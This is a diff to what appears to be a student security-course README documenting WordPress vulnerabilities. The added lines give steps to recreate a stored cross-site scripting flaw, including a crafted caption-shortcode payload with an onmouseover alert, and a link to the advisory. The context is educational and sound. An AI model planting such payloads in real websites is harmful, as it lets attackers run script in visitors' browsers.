@@ -14,8 +14,11 @@ Time spent: **X** hours spent in total
   - [ ] GIF Walkthrough: 
        - <img src="xss.gif" width="800">
   - [ ] Steps to recreate: 
+   - react a new page with name test
+   - add code `<a href="[caption code=">]</a><a title=" onmouseover=alert('test') ">link</a>`
+   - view page to see the alert
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+    - [Link 1](https://klikki.fi/adv/wordpress3.html)
 1. (Required) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
